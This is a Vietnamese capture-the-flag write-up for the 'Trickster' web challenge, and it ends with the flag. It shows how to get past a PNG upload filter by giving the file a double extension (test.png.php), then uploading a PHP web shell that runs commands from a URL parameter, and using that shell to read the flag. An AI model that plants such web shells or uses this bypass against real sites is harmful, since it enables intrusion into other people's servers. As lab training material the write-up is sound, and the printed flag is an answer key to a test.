# Trickster

![image.png](Trickster/image.png)

![image.png](Trickster/image%201.png)

Đây là 1 trang web chỉ cho chúng ta tải lên file ảnh png

![image.png](Trickster/image%202.png)

Mình dùng `ffuf` thì phát hiện ra cáo file `robots.txt` nền mình sẽ truy cập thử

![image.png](Trickster/image%203.png)

Mình tiếp tục thấy có 2 đường dẫn 1 cái thì là dẫn đến file `instructions.txt` và 1 đường  dẫn còn lại là đến thư mục `/uploads` có vẻ như là nơi lưu trữ những bức ảnh mà chúng ta upload lên 

![image.png](Trickster/image%204.png)

Trong file `instructions.txt` mình thấy cơ chế của web nó sẽ kiểm tra `extension` xem có phải là `‘.png’` không và `magic bytes` xem có đúng của định dạng png không 

![image.png](Trickster/image%205.png)

Ở đây đầu tiên mình tải lên file ảnh có `extension` là `.png` và `magic byte` là của png nhưng mà ngay trong file ảnh mình có ghi thêm `payload` vào 

```sql
<?php phpinfo(); ?>
```

![image.png](Trickster/image%206.png)

Sau đó mình sẽ truy cập thử xem file ảnh của mình có được thực thi nhưng có vẻ như là không thành công, giờ chúng ta sẽ cần chuyển hướng khác 

Đối với file thì có thể có nhiều `extension` mình không biết web sẽ kiểm tra `extension` bằng cách lấy phần `extension` sau dấu chấm đầu tiên hay lấy phần `extension` cuối cùng nên giờ mình sẽ chèn thêm `extension` thực thi ở cuối 

```sql
test.png.php
```

![image.png](Trickster/image%207.png)

Mình đã tải file thành công có vẻ như nó chỉ kiểm tra `extension` sau dấu chấm đầu tiên thôi 

![image.png](Trickster/image%208.png)

Mình truy cập và thấy code của mình đã được thực thi giờ chúng ta sẽ đi tìm flag 

![image.png](Trickster/image%209.png)

Mình sẽ cần thay đổi `payload` để có thể thực thi code từ xa

```sql
<?php
    system($_GET['cmd']);
?>
```

![image.png](Trickster/image%2010.png)

Mình đang trong thư mục `upload` và thư mục này không có gì 

![image.png](Trickster/image%2011.png)

Thư mục `root` cũng vậy mình cũng không thấy gì lắm nên là mình quyết định thử check `thư mục gốc của web` xem sao 

```sql
var/www/html
```

![image.png](Trickster/image%2012.png)

Có 1 file `txt` tên khá lạ mình sẽ đọc thử nó

![image.png](Trickster/image%2013.png)

Thành công lấy được flag

academy{c3rt!fi3d_Xp3rt_tr1ckst3r_b0eea9c8}